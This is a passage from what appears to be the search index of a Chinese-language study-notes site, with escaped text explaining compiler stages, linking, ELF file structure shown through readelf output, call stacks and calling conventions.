Semantic)\u662f\u6307\u5728\u8fd0\u884c\u671f\u51fa\u73b0\u7684\u8bed\u4e49\u76f8\u5173\u95ee\u9898\uff0c\u4f8b\u5982\u5c060\u4f5c\u4e3a\u9664\u6570\u662f\u4e00\u4e2a\u8fd0\u884c\u671f\u8bed\u6cd5\u9519\u8bef\u3002</p> <p>\u6b64\u9636\u6bb5\uff0c\u8bed\u6cd5\u6811\u4e2d\u7684\u8868\u8fbe\u5f0f\u90fd\u88ab\u6807\u8bc6\u4e86\u7c7b\u578b\uff0c\u7b26\u53f7\u8868\u91cc\u7684\u7b26\u53f7\u7c7b\u578b\u4e5f\u505a\u4e86\u66f4\u65b0:</p> <p></p>"},{"location":"sicp/program/#_8","title":"\u4e2d\u95f4\u8bed\u8a00\u751f\u6210","text":"<p>\u7f16\u8bd1\u5668\u4e0b\u4e00\u6b65\u8981\u505a\u7684\u662f\u6e90\u7801\u4f18\u5316\uff0c\u4e0a\u4f8b\u4e2d\u7684(2+6)\u8fd9\u4e2a\u8868\u8fbe\u5f0f\u5728\u8fd9\u4e00\u6b65\u4f1a\u88ab\u4f18\u5316\u6389\uff0c\u56e0\u4e3a\u5b83\u7684\u503c\u7f16\u8bd1\u671f\u5c31\u662f\u53ef\u4ee5\u786e\u5b9a\u7684\u3002\u8fd9\u4e2a\u9636\u6bb5\uff0c\u6e90\u7801\u4f18\u5316\u5668(Source Code Optimizer)\u4f1a\u5c06\u8bed\u6cd5\u6811\u8f6c\u6362\u4e3a\u4e2d\u95f4\u4ee3\u7801(Intermediate Code)\uff0c\u5b83\u662f\u8bed\u6cd5\u6811\u7684\u987a\u5e8f\u8868\u793a\uff0c\u5728\u4e0d\u540c\u7f16\u8bd1\u5668\u6709\u4e0d\u540c\u7684\u7c7b\u578b\uff0c\u5e38\u89c1\u7684\u6709\u4e09\u5730\u5740\u7801(Three-address Code)\u548cP-\u4ee3\u7801(P-Code)\u3002\u4e09\u5730\u5740\u7801\u5373<code>x = y op z</code>\uff0c\u8868\u793a\u5c06y\u548cz\u64cd\u4f5c\u7684\u7ed3\u679c\u590d\u5236\u7ed9x\uff0c\u6240\u4ee5\u4e0a\u4f8b\u8868\u8fbe\u5f0f\u4f1a\u88ab\u8f6c\u6362\u4e3a: <pre><code>t1 = 2 + 6\nt2 = index + 4\nt3 = t2 * t1\narray[index] = t3\n</code></pre> \u7ecf\u8fc7\u4f18\u5316\u540e\u5c31\u662f: <pre><code>t1 = index + 4\nt2 = t1 * 8\narray[index] = t2\n</code></pre> \u4e2d\u95f4\u4ee3\u7801\u5c06\u7f16\u8bd1\u5668\u5206\u4e3a\u524d\u7aef\u548c\u540e\u7aef\uff0c\u524d\u7aef\u8d1f\u8d23\u4ea7\u751f\u4e0e\u673a\u5668\u65e0\u5173\u7684\u4e2d\u95f4\u4ee3\u7801\uff0c\u540e\u7aef\u8d1f\u8d23\u628a\u8fd9\u4e9b\u4e2d\u95f4\u4ee3\u7801\u8f6c\u6362\u4e3a\u76ee\u6807\u673a\u5668\u4e0a\u7684\u4ee3\u7801\uff0c\u5982\u6b64\u53ef\u4ee5\u8ba9\u7f16\u8bd1\u5668\u4f7f\u7528\u4e00\u4e2a\u524d\u7aef\u3001\u591a\u4e2a\u540e\u7aef\uff0c\u4ece\u800c\u5177\u5907\u8de8\u5e73\u53f0\u7684\u80fd\u529b\u3002</p>"},{"location":"sicp/program/#_9","title":"\u76ee\u6807\u4ee3\u7801\u751f\u6210\u4e0e\u4f18\u5316","text":"<p>\u7f16\u8bd1\u5668\u540e\u7aef\u4e3b\u8981\u5305\u62ec\u4ee3\u7801\u751f\u6210\u5668(Code Generator)\u548c\u76ee\u6807\u4ee3\u7801\u4f18\u5316\u5668(Target Code Optimizer)\u3002\u7531\u4e8e\u76ee\u6807\u673a\u5668\u6709\u4e0d\u540c\u7684\u5b57\u957f\u3001\u5bc4\u5b58\u5668\u3001\u6574\u6570\u6570\u636e\u7c7b\u578b\u7b49\uff0c\u4ee3\u7801\u751f\u6210\u5668\u4e5f\u5c31\u4e0d\u76f8\u540c\uff0c\u4ee5x86\u4e3a\u4f8b\uff0c\u4e0a\u4f8b\u4e2d\u95f4\u4ee3\u7801\u751f\u6210\u7684\u6c47\u7f16\u4ee3\u7801\u4e3a: <pre><code>movl index, %ecx\naddl $4, %ecx\nmull $8, %ecx\nmovl index, %eax\nmovl %ecx, array(,eax,4)\n</code></pre></p> <p>\u63a5\u7740\uff0c\u76ee\u6807\u4ee3\u7801\u4f18\u5316\u5668\u4f1a\u8fdb\u884c\u4f18\u5316\uff0c\u4f8b\u5982\u9009\u62e9\u5408\u9002\u7684\u5bfb\u5740\u65b9\u5f0f\u3001\u901a\u8fc7\u4f4d\u79fb\u6765\u4ee3\u66ff\u4e58\u6cd5\u8fd0\u7b97\u3001\u5220\u9664\u5197\u4f59\u6307\u4ee4\u7b49\u3002\u4e0a\u4f8b\u4e2d\u4e58\u6cd5\u53ef\u4ee5\u7531\u4e00\u6761\u76f8\u5bf9\u590d\u6742\u7684\u57fa\u5740\u6bd4\u4f8b\u53d8\u5740\u5bfb\u5740(Basic Index Scale Addressing)\u7684lea\u6307\u4ee4\u6765\u5b8c\u6210\uff0c\u4f18\u5316\u540e\u7684\u4ee3\u7801\u4e3a: <pre><code>movl index, %edx\nleal 32(,%edx,8), %eax\nmovl %eax, array(,%edx,4)\n</code></pre></p>"},{"location":"sicp/program/#_10","title":"\u6c47\u7f16","text":"<p>\u6c47\u7f16\u5668\u662f\u5c06\u6c47\u7f16\u4ee3\u7801\u8f6c\u53d8\u6210\u673a\u5668\u53ef\u4ee5\u6267\u884c\u7684\u6307\u4ee4\uff0c\u6bcf\u4e00\u4e2a\u6c47\u7f16\u8bed\u53e5\u51e0\u4e4e\u5bf9\u5e94\u7740\u4e00\u6761\u673a\u5668\u6307\u4ee4\u3002\u6240\u4ee5\u8fd9\u4e00\u6b65\u5176\u5b9e\u76f8\u5bf9\u7b80\u5355\uff0c\u6ca1\u6709\u4f18\u5316\u89e3\u6790\u7684\u8fc7\u7a0b\uff0c\u53ea\u9700\u4e00\u4e00\u7ffb\u8bd1\u5c31\u53ef\u4ee5\u4e86\u3002\u53ef\u4ee5\u901a\u8fc7<code>gcc -c hello.s -o hello.o</code>\u6765\u5f97\u5230\u76ee\u6807\u6587\u4ef6(Object File)\u3002</p>"},{"location":"sicp/program/#_11","title":"\u94fe\u63a5","text":"<p>\u5982\u679c\u6c47\u7f16\u6307\u4ee4\u5f53\u4e2d\u7684\u7b26\u53f7\u90fd\u662f\u5728\u4e00\u4e2a\u7f16\u8bd1\u5355\u5143\u5185\u7684\uff0c\u90a3\u4e48\u7f16\u8bd1\u5668\u5c31\u53ef\u4ee5\u53bb\u786e\u5b9a\u8fd9\u4e9b\u7b26\u53f7\u7684\u5730\u5740\u3002\u7136\u800c\u73b0\u4ee3\u8f6f\u4ef6\u5f80\u5f80\u662f\u7531\u590d\u6742\u7684\u6a21\u5757\u6784\u6210\u7684\uff0c\u5373\u4f7f\u662f\u8f93\u51fa\u4e00\u4e2a\u7b80\u5355\u7684hello world\u4e5f\u8981\u5bfc\u5165C\u6807\u51c6\u5e93\u3002\u90a3\u4e48\u6bcf\u4e2a\u6e90\u4ee3\u7801\u6a21\u5757\u5c31\u9700\u8981\u5355\u72ec\u7684\u7f16\u8bd1\uff0c\u7136\u540e\u6309\u7167\u987a\u5e8f\u628a\u5b83\u4eec\u7ec4\u88c5\u8d77\u6765\uff0c\u8fd9\u4e2a\u8fc7\u7a0b\u5c31\u662f\u94fe\u63a5(Linking)\u3002\u6a21\u5757\u95f4\u7684\u51fd\u6570\u8c03\u7528\u3001\u53d8\u91cf\u5f15\u7528\u7b49\u90fd\u662f\u9700\u8981\u901a\u8fc7\u7b26\u53f7\u6765\u901a\u4fe1\u7684\uff0c\u94fe\u63a5\u5668\u5c31\u662f\u628a\u6307\u4ee4\u4e2d\u5bf9\u4e8e\u5176\u4ed6\u7b26\u53f7\u7684\u5f15\u7528\u52a0\u4ee5\u4fee\u6b63\uff0c\u6574\u4e2a\u8fc7\u7a0b\u53c8\u5305\u542b\u4e86\u5730\u5740\u548c\u7a7a\u95f4\u5206\u914d(Address and Storage Allocation)\u3001\u7b26\u53f7\u51b3\u8bae(Symbol Resolution,\u6216\u540d\u79f0\u7ed1\u5b9aName Binding)\u548c\u91cd\u5b9a\u4f4d(Relocation)\u8fd9\u4e9b\u6b65\u9aa4\u3002</p> <p></p>"},{"location":"sicp/program/#_12","title":"\u9759\u6001\u94fe\u63a5\u4e0e\u52a8\u6001\u94fe\u63a5","text":"<p>\u628a\u591a\u4e2a\u76ee\u6807\u6a21\u5757(.o)\u6253\u5305\u6210\u4e00\u4e2a\u72ec\u7acb\u6587\u4ef6(.a)\uff0c\u8fd9\u79cd\u65b9\u5f0f\u79f0\u4e3a\u9759\u6001\u5e93\u3002\u6211\u4eec\u5728\u5199\u81ea\u5df1\u7684\u4ee3\u7801\u5f15\u7528\u5230\u9759\u6001\u5e93\u7684\u67d0\u4e2a\u51fd\u6570\u7684\u65f6\u5019\uff0c\u5b9e\u9645\u4e0a\u94fe\u63a5\u5668\u662f\u628a\u9759\u6001\u5e93\u5f53\u505a\u4e00\u4e2a\u76ee\u6807\u6a21\u5757\u4f5c\u4e3a\u5176\u8f93\u5165\u3002</p> <p>\u76f8\u6bd4\u4e8e\u9759\u6001\u5e93\u5185\u5d4c\u7684\u65b9\u5f0f\uff0c\u52a8\u6001\u94fe\u63a5\u5e93(.so\u6587\u4ef6\u6216win\u4e0b\u7684.dll\u6587\u4ef6)\u662f\u5728\u8fd0\u884c\u65f6\u7531\u52a8\u6001\u94fe\u63a5\u5668\u6267\u884c\u52a8\u6001\u94fe\u63a5\uff0c\u5b83\u53ef\u88ab\u52a0\u8f7d\u5230\u4efb\u610f\u4f4d\u7f6e\u3002</p> <p>\u5f88\u591a\u5e93\u65e2\u63d0\u4f9b\u4e86\u52a8\u6001\u94fe\u63a5\u7248\u672c\uff0c\u4e5f\u63d0\u4f9b\u4e86\u9759\u6001\u5e93\u7248\u672c\uff0c\u6bd4\u5982C\u7684\u6807\u51c6\u5e93libc.so\u548clibc.a\u3002\u6211\u4eec\u5728\u7f16\u8bd1\u7684\u65f6\u5019\u53ef\u4ee5\u901a\u8fc7<code>gcc -static</code>\u6765\u6307\u5b9a\u4f7f\u7528\u5176\u9759\u6001\u5e93\u7248\u672c\uff0c\u8fd9\u6837\u7f16\u8bd1\u597d\u7684\u76ee\u6807\u6587\u4ef6\u5c31\u53ef\u4ee5\u4e0d\u4f9d\u8d56\u64cd\u4f5c\u7cfb\u7edf\u7684\u73af\u5883\u53bb\u8fd0\u884c\u3002Go\u8bed\u8a00\u5c31\u91c7\u7528\u9759\u6001\u94fe\u63a5\u7684\u65b9\u5f0f\uff0c\u5b83\u7684\u53ef\u6267\u884c\u7a0b\u5e8f\u5f80\u5f80\u590d\u5236\u5728\u540c\u7c7b\u64cd\u4f5c\u7cfb\u7edf\u4e0a\u5c31\u80fd\u8fd0\u884c\u3002</p>"},{"location":"sicp/program/#_13","title":"\u53ef\u6267\u884c\u6587\u4ef6","text":"<p>\u4e00\u4e2a\u200b\u53ef\u6267\u884c\u7a0b\u5e8f\u200b\u770b\u4e0a\u53bb\u50cf\u662f\u5355\u4e2a\u6587\u4ef6\u7684\u6570\u636e\u5e93\uff0c\u6211\u4eec\u4ee5ELF\u683c\u5f0f\u7684\u53ef\u6267\u884c\u6587\u4ef6\u4e3a\u4f8b\uff0c\u5b83\u5305\u62ec\u5934\u90e8\u5143\u6570\u636e\u3001Section header table\u3001Program header table\u548c\u5404\u4e2asection\u6bb5\u3002</p>"},{"location":"sicp/program/#head","title":"Head","text":"<p>\u6587\u4ef6\u5934\u90e8\u5305\u542b\u4e00\u4e9b\u5143\u6570\u636e\uff0c\u7528\u4e8e\u8fdb\u7a0b\u52a0\u8f7d\u627e\u5165\u53e3\u5730\u5740\u7b49:</p> <pre><code>[ubuntu] ~/.mac/assem $ readelf -h hello\nELF Header:\n  Magic:   7f 45 4c 46 02 01 01 00 00 00 00 00 00 00 00 00      // \u9b54\u6cd5\u6570\uff0c\u53ef\u4ee5\u5feb\u901f\u8bfb\u53d6\u51fa\u6765\u7528\u4e8e\u9884\u5224\u6574\u4e2a\u6587\u4ef6\u662f\u4e0d\u662f\u4e00\u4e2a\u5408\u6cd5\u7684\u5185\u5bb9\n  Class:                             ELF64          // ELF\u6587\u4ef6\u7684\u683c\u5f0f\n  Data:                              2's complement, little endian  // \u5927\u5c0f\u7aef\u60c5\u51b5\n  Version:                           1 (current)\n  OS/ABI:                            UNIX - System V    // \u54ea\u4e2a\u5e73\u53f0\u4f7f\u7528\n  ABI Version:                       0\n  Type:                              EXEC (Executable file)     // \u54ea\u79cd\u7c7b\u578b\uff0c\u53ef\u6267\u884c\u7684\u8fd8\u662f\u9700\u91cd\u5b9a\u4f4d\u7684\u7b49\n  Machine:                           Advanced Micro Devices X86-64\n  Version:                           0x1\n  Entry point address:               0x4000b0       //\u5165\u53e3\u5730\u5740\n  Start of program headers:          64 (bytes into file)\n  Start of section headers:          736 (bytes into file)\n  Flags:                             0x0\n  Size of this header:               64 (bytes)\n  Size of program headers:           56 (bytes)\n  Number of program headers:         2\n  Size of section headers:           64 (bytes)\n  Number of section headers:         8\n  Section header string table index: 7\n</code></pre>"},{"location":"sicp/program/#section","title":"Section","text":"<p>\u5934\u90e8\u4e4b\u540e\u7d27\u8ddf\u7740\u5404\u79cd\u5404\u6837\u7684\u8868\uff0c\u6211\u4eec\u79f0\u4e4b\u4e3a\u200bSection\u200b(\u6bb5)\uff0c\u5404\u4e2asection\u88ab\u8ba1\u5165\u53ef\u6267\u884c\u6587\u4ef6\u7684Section header table\u4e2d\uff0c\u6211\u4eec\u53ef\u4ee5\u8fd9\u6837\u67e5\u770b:</p> <pre><code>[ubuntu] ~/.mac/assem $ readelf -S hello\nThere are 8 section headers, starting at offset 0x2e0:\nSection Headers:\n  [Nr] Name              Type             Address           Offset\n       Size              EntSize          Flags  Link  Info  Align\n  [ 0]                   NULL             0000000000000000  00000000\n       0000000000000000  0000000000000000           0     0     0\n  [ 1] .text             PROGBITS         00000000004000b0  000000b0\n       0000000000000025  0000000000000000  AX       0     0     16\n  [ 2] .data             PROGBITS         00000000006000d8  000000d8\n       000000000000000e  0000000000000000  WA       0     0     4\n  [ 3] .stab             PROGBITS         0000000000000000  000000e8\n       0000000000000084  0000000000000014           4     0     4\n  [ 4] .stabstr          STRTAB           0000000000000000  0000016c\n       0000000000000009  0000000000000000           0     0     1\n  [ 5] .symtab           SYMTAB           0000000000000000  00000178\n       0000000000000108  0000000000000018           6     7     8\n  [ 6] .strtab           STRTAB           0000000000000000  00000280\n       0000000000000027  0000000000000000           0     0     1\n  [ 7] .shstrtab         STRTAB           0000000000000000  000002a7\n       0000000000000036  0000000000000000           0     0     1\nKey to Flags:\n  W (write), A (alloc), X (execute), M (merge), S (strings), I (info),\n  L (link order), O (extra OS processing required), G (group), T (TLS),\n  C (compressed), x (unknown), o (OS specific), E (exclude),\n  l (large), p (processor specific)\n</code></pre> <p>\u5176\u4e2d\uff0c<code>Address</code>\u8868\u793a\u8fd9\u4e2asection\u52a0\u8f7d\u5230\u8fdb\u7a0b\u4e2d\u7684\u865a\u62df\u5185\u5b58\u5730\u5740\uff0c<code>Offset</code>\u8868\u793a\u8fd9\u4e2asection\u76f8\u5bf9\u4e8e\u6587\u4ef6\u5934\u90e8\u7684\u504f\u79fb\u91cf\uff0c\u6709\u4e86<code>Offset</code>+<code>Size</code>\u8fdb\u7a0b\u624d\u77e5\u9053\u5982\u4f55\u5b89\u6392\u76f8\u5e94\u7684<code>Address</code>\u3002<code>Flags</code>\u8868\u793a\u6743\u9650\u6807\u5fd7\u4f4d\uff0c<code>A</code>\u8868\u793a\u8fd9\u4e2asection\u7684\u5185\u5bb9\u9700\u8981\u5728\u5185\u5b58\u4e2d\u8f7d\u5165\uff0c<code>X</code>\u8868\u793a\u53ef\u6267\u884c\u7684\u6743\u9650\uff0c<code>W</code>\u8868\u793a\u53ef\u5199\u5165\u7684\u6743\u9650\u3002</p> <p><code>.text</code>\u7528\u4e8e\u5b58\u653e\u4e8c\u8fdb\u5236\u7684\u6267\u884c\u4ee3\u7801(\u6307\u4ee4)\u3002\u6211\u4eec\u53ef\u4ee5\u770b\u5230\u8fd9\u4e2a\u6bb5\u7684\u5730\u5740\u6070\u597d\u662f\u6587\u4ef6\u5934\u4e2d\u7684Entry point address\u3002</p> <p><code>.data</code>\u7528\u4e8e\u5b58\u653e\u6240\u6709\u5df2\u7ecf\u521d\u59cb\u5316\u8fc7\u7684\u5168\u5c40\u53d8\u91cf\u7684\u6570\u636e\uff0c<code>.bss</code>\u7528\u4e8e\u5b58\u653e\u672a\u521d\u59cb\u5316\u7684\u5168\u5c40\u53d8\u91cf\u6570\u636e\uff0c\u867d\u7136\u5b83\u4eec\u5728\u5185\u5b58\u4e2d\u90fd\u9700\u8981\u76f8\u5e94\u7684\u8d77\u59cb\u5730\u5740\u548c\u5185\u5b58\u533a\u57df\uff0c\u4f46\u5728\u53ef\u6267\u884c\u6587\u4ef6\u4e2d\u6ca1\u5fc5\u8981\u7528\u4e00\u5b9a\u533a\u57df\u53bb\u8bb0\u4e0b<code>.bss</code>\u4e2d\u7684\u96f6\u503c\u3002<code>.rodata</code>\u4e13\u95e8\u7528\u4e8e\u4fdd\u5b58\u53ea\u8bfb\u6570\u636e\uff0c\u4f8b\u5982\u5b57\u7b26\u4e32\u7684\u5b57\u9762\u91cf\uff0c\u5728\u5f88\u591a\u8bed\u8a00\u4e2d\u5b83\u90fd\u662f\u53ea\u8bfb\u7684\u3002</p> <p><code>.symtab</code>\u8868\u793a\u7b26\u53f7\u8868\uff0c\u5b58\u50a8\u4e86\u7a0b\u5e8f\u5b9a\u4e49\u548c\u5f15\u7528\u7684\u51fd\u6570\u548c\u5168\u5c40\u53d8\u91cf\u4fe1\u606f:</p> <ul> <li>\u5f53\u524d\u6a21\u5757\u5185\uff0c\u53ef\u88ab\u5916\u90e8\u5f15\u7528\u7684\u5168\u5c40\u7b26\u53f7\uff0c\u6bd4\u5982\u51fd\u6570\u548c\u5168\u5c40\u53d8\u91cf\uff08\u975e static\uff09\u3002</li> <li>\u53ea\u88ab\u5f53\u524d\u6a21\u5757\u5b9a\u4e49\u548c\u5f15\u7528\u7684\u672c\u5730\u7b26\u53f7\uff0c\u6bd4\u5982 static \u51fd\u6570\u548c\u53d8\u91cf\uff0c\u4e0d\u80fd\u88ab\u5916\u90e8\u5f15\u7528\u3002</li> <li>\u5176\u4ed6\u6a21\u5757\u5b9a\u4e49\uff0c\u88ab\u5f53\u524d\u6a21\u5757\u6240\u5f15\u7528\u7684\u5168\u5c40\u7b26\u53f7\uff08external\uff09\u3002</li> </ul> <p>\u5bf9\u4e8e\u7a0b\u5e8f\u8fd0\u884c\u6765\u8bb2\uff0c\u7b26\u53f7\u8868\u6ca1\u6709\u4ec0\u4e48\u7528\uff0cCPU\u4e0d\u7ba1\u4ec0\u4e48\u7b26\u53f7\u3001\u7c7b\u578b\uff0c\u5b83\u53ea\u9700\u8981\u5185\u5b58\u5730\u5740\u3002\u7b26\u53f7\u5c31\u76f8\u5f53\u4e8e\u662f\u5185\u5b58\u5730\u5740\u7684\u52a9\u8bb0\u7b26\uff0c\u4e3b\u8981\u662f\u4fbf\u4e8e\u6211\u4eec\u8c03\u8bd5\u548c\u53cd\u6c47\u7f16\u4f7f\u7528\u7684\u3002</p>"},{"location":"sicp/program/#segment","title":"Segment","text":"<p>\u6267\u884c\u7684\u65f6\u5019\uff0c\u6211\u4eec\u9700\u8981\u544a\u8bc9\u64cd\u4f5c\u7cfb\u7edf\uff0c\u6709\u54ea\u4e9bsection\u9700\u8981\u8f7d\u5165\u4e3a\u5185\u5b58\u4e2d\u7684\u200bsegment\u200b\uff0c\u8fd9\u4e2a\u4fe1\u606f\u88ab\u94fe\u63a5\u5668\u653e\u5728Program header table\u4e2d\uff0c\u64cd\u4f5c\u7cfb\u7edf\u7684\u8f7d\u5165\u5668\u4ee5\u6b64\u4fe1\u606f\u6765\u5b89\u6392\u7a0b\u5e8f\u5728\u5185\u5b58\u4e2d\u7684\u6837\u5b50\uff0c\u6211\u4eec\u53ef\u4ee5\u8fd9\u6837\u67e5\u770b:</p> <pre><code>[ubuntu] ~/.mac/assem $ readelf -l hello\nElf file type is EXEC (Executable file)\nEntry point 0x4000b0\nThere are 2 program headers, starting at offset 64\nProgram Headers:\n  Type           Offset             VirtAddr           PhysAddr\n                 FileSiz            MemSiz              Flags  Align\n  LOAD           0x0000000000000000 0x0000000000400000 0x0000000000400000\n                 0x00000000000000d5 0x00000000000000d5  R E    0x200000\n  LOAD           0x00000000000000d8 0x00000000006000d8 0x00000000006000d8\n                 0x000000000000000e 0x000000000000000e  RW     0x200000\n Section to Segment mapping:\n  Segment Sections...\n   00     .text\n   01     .data\n</code></pre> <p>\u4e0a\u9762\u7684section to segment mapping\u5c31\u8868\u793a\u628asection\u4e2d\u7684<code>.text</code>\u6bb5\u7684\u5185\u5bb9\u653e\u5728\u5185\u5b58\u4e2d<code>00</code>\u53f7\u7684segment\u4e0a\u3002\u5728\u53ef\u6267\u884c\u6587\u4ef6\u4e2d\u4f1a\u628asection\u5206\u7684\u5f88\u7ec6\uff0c\u4f46\u5728\u5185\u5b58\u4e2d\u53ef\u80fd\u4f1a\u628a\u4e00\u4e9bsection\u5408\u5e76\u8d77\u6765\uff0c\u5ffd\u7565\u6389\u4e00\u4e9bsection\uff0c\u8d77\u5230\u8282\u7ea6\u5185\u5b58\u7684\u76ee\u7684\u3002</p>"},{"location":"sicp/program/#_14","title":"\u51fd\u6570\u8c03\u7528","text":"<p>\u51fd\u6570\u200b\u672c\u8eab\u76f8\u5f53\u4e8e\u4e00\u4e2a\u56fe\u7eb8\uff0c\u51fa\u4e86\u8bbe\u8ba1\u9662\u5b83\u5c31\u662f\u53ea\u8bfb\u7684\uff0c\u653e\u5728<code>.text</code>\u6bb5\u4e2d\uff0c\u7ebf\u7a0b\u53c2\u8003\u56fe\u7eb8\u6765\u6267\u884c\u3002\u7ebf\u7a0b\u901a\u8fc7<code>IP/PC</code>\u5bc4\u5b58\u5668\u77e5\u9053\u6267\u884c\u5230\u56fe\u7eb8\u7684\u54ea\u91cc\uff0c\u4e0b\u4e00\u6761\u6307\u4ee4\u662f\u4ec0\u4e48\uff0c\u4e3b\u7ebf\u7a0b\u901a\u8fc7\u53ef\u6267\u884c\u6587\u4ef6\u7684\u5165\u53e3\u5730\u5740\u627e\u5230\u7b2c\u4e00\u6761\u6307\u4ee4\u3002</p>"},{"location":"sicp/program/#_15","title":"\u8c03\u7528\u5806\u6808","text":"<p>\u90a3\u4e48\u6bcf\u4e2aCPU\u6838\u5fc3\u53ea\u6709\u4e00\u4e2aIP\u5bc4\u5b58\u5668\uff0c\u7ebf\u7a0b\u5374\u6709\u5f88\u591a\u4e2a\u600e\u4e48\u529e\uff1f\u5b9e\u9645\u4e0a\u5728\u540c\u4e00\u65f6\u523b\uff0c\u53ea\u6709\u4e00\u4e2a\u7ebf\u7a0b\u7ed1\u5b9a\u4e86\u4e00\u5957\u7269\u7406\u5bc4\u5b58\u5668\uff0c\u82e5\u5b83\u7684\u65f6\u95f4\u7247\u7528\u5b8c\u4e86\u5219\u7531\u64cd\u4f5c\u7cfb\u7edf\u4fdd\u5b58\u5b83\u5bf9\u5e94\u7684\u5bc4\u5b58\u5668\u72b6\u6001\u5728\u67d0\u6bb5\u5185\u5b58\u4e2d\uff0c\u4e0b\u6b21\u8f6e\u5230\u5b83\u6267\u884c\u65f6\u518d\u6062\u590d\u5bc4\u5b58\u5668\u7684\u72b6\u6001\u3002\u90a3\u4e48\u6211\u4eec\u53ef\u4ee5\u5728\u62bd\u8c61\u5c42\u9762\u4e0a\u7406\u89e3\u4e3a\u6bcf\u4e2a\u7ebf\u7a0b\u90fd\u6709\u4e00\u5957\u81ea\u5df1\u7684\u5bc4\u5b58\u5668\u3002\u540c\u65f6\uff0c\u8fd9\u79cd\u5207\u6362\u7ebf\u7a0b\u9700\u8981\u6d88\u8017\u4e00\u5b9a\u7684\u8d44\u6e90\uff0c\u7528\u4e8e\u4fdd\u5b58\u548c\u6062\u590d\u72b6\u6001\uff0c\u7528\u4e8e\u5185\u6838\u6001\u548c\u7528\u6237\u6001\u7684\u5207\u6362\u3002</p> <p>\u51fd\u6570\u6267\u884c\u8fc7\u7a0b\u4e2d\u9700\u8981\u5728\u7ebf\u7a0b\u4e2d\u4fdd\u5b58\u53c2\u6570\u3001\u8fd4\u56de\u503c\u3001\u5c40\u90e8\u53d8\u91cf\u7b49\uff0c\u8fd9\u5757\u5185\u5b58\u53eb\u505a\u200b\u6808\u200b(Stack)\u3002\u90a3\u4e48\u5982\u679c\u662f\u5d4c\u5957\u8c03\u7528\uff0c\u5982\u4f55\u4fdd\u5b58\u5404\u51fd\u6570\u7684\u72b6\u6001\u5462\uff1f</p> <p></p> <p>\u5982\u5de6\u56fe\u6240\u793a\uff0cA\u51fd\u6570\u5d4c\u5957\u4e86B\u51fd\u6570\uff0cA\u8981\u7b49\u5f85B\u6267\u884c\u5b8c\u6210\u4e4b\u540e\u518d\u63a5\u7740\u6267\u884c\u81ea\u5df1\u7684\u903b\u8f91\u3002\u6240\u4ee5\u6211\u4eec\u4e00\u822c\u628a\u6808\u5185\u5b58\u7ad6\u7740\u753b\uff0c\u7531\u5e95\u90e8\u7684\u9ad8\u4f4d\u5411\u4f4e\u4f4d\u5206\u914d\uff0c\u51fd\u6570\u6267\u884c\u7ed3\u675f\u5219\u628a\u5176\u5bf9\u5e94\u7684\u5185\u5b58\u533a\u57df\u9500\u6bc1\uff0c\u5982\u53f3\u56fe\u6240\u793a\u3002\u6211\u4eec\u628a\u6bcf\u4e00\u4e2a\u51fd\u6570\u6240\u5360\u7684\u683c\u5b50\u53eb\u200b\u6808\u5e27\u200b(Stack Frame)\uff0c\u628a\u6574\u4e2aA\u3001B\u3001C\u7684\u8c03\u7528\u5c42\u6b21\u79f0\u4e3a\u200b\u8c03\u7528\u5806\u6808\u200b(Call Stack)\u3002\u7a0b\u5e8f\u51fa\u9519\u65f6\u5019\u6211\u4eec\u770b\u5230\u4e00\u7ea7\u7ea7\u7684\u9519\u8bef\u4fe1\u606f\u5c31\u662f\u901a\u8fc7\u8c03\u7528\u5806\u6808\u8ffd\u6eaf\u5230\u7684\u3002</p> <p>\u8c03\u7528\u4e00\u4e2a\u51fd\u6570\uff0c\u5728\u6307\u4ee4\u7ea7\u522b\u4e0a\u8fd8\u662f\u6709\u5f88\u5927\u7684\u5f00\u9500\u7684\uff0c\u6240\u4ee5\u6709\u4e86\u200b\u5185\u8054\u200b(inline)\u7684\u4f18\u5316\u624b\u6bb5\u3002</p>"},{"location":"sicp/program/#_16","title":"\u8c03\u7528\u7ea6\u5b9a","text":"<p>\u63a5\u4e0b\u6765\u7684\u95ee\u9898\u662fA\u8c03\u7528B\u7684\u65f6\u5019\uff0c\u5982\u4f55\u7ed9B\u4f20\u9012\u53c2\u6570\uff0c\u5982\u4f55\u63a5\u6536B\u7684\u8fd4\u56de\u503c\uff0c\u8981\u4e48A\u5212\u5b9a\u533a\u57df\uff0c\u8981\u4e48B\u5212\u5b9a\u533a\u57df\uff0c\u8981\u4e48\u7528\u5bc4\u5b58\u5668\uff0c\u8981\u4e48\u7528\u5185\u5b58\uff0c\u6211\u4eec\u628a\u8fd9\u79cd\u7ea6\u5b9a\u79f0\u4e3a\u200b\u8c03\u7528\u7ea6\u5b9a\u3002\u4ee5Go\u8bed\u8a00\u4e3a\u4f8b\uff0c\u82e5A\u8c03\u7528B\uff0c\u5219A\u4f1a\u628a\u81ea\u5df1\u7684\u6808\u5e27\u4e00\u5206\u4e3a\u4e8c\uff0c\u4e0b\u534a\u90e8\u5206\u5b58\u672c\u5730\u5c40\u90e8\u53d8\u91cf\uff0c\u4e0a\u534a\u90e8\u5206\u5b58\u7ed9B\u7528\u7684\u53c2\u6570\u548cB\u7684\u8fd4\u56de\u503c\u3002\u82e5A\u8c03\u7528B\u3001C\u3001D\u7b49\u591a\u4e2a\u51fd\u6570\uff0c\u5219\u4e0a\u534a\u90e8\u5206\u5360\u7528\u591a\u5927\u7a7a\u95f4\u6309\u54ea\u4e2a\u51fd\u6570\u7684\u53c2\u6570\u548c\u8fd4\u56de\u503c\u6700\u5927\u6765\u7b97\u3002\u5982\u6b64\u4e00\u6765\uff0c\u6808\u5e27\u7684\u5927\u5c0f\u662f\u5728\u7f16\u8bd1\u671f\u5c31\u80fd\u786e\u5b9a\u7684\uff0c\u8bbf\u95ee\u6808\u5185\u67d0\u5757\u5185\u5b58\u53ea\u9700\u6839\u636e\u76f8\u5bf9\u4f4d\u7f6e\uff0c\u57fa\u4e8e\u6808\u9876\u505a\u52a0\u6cd5\u6216\u6808\u5e95\u505a\u51cf\u6cd5\u5373\u53ef\u3002</p> 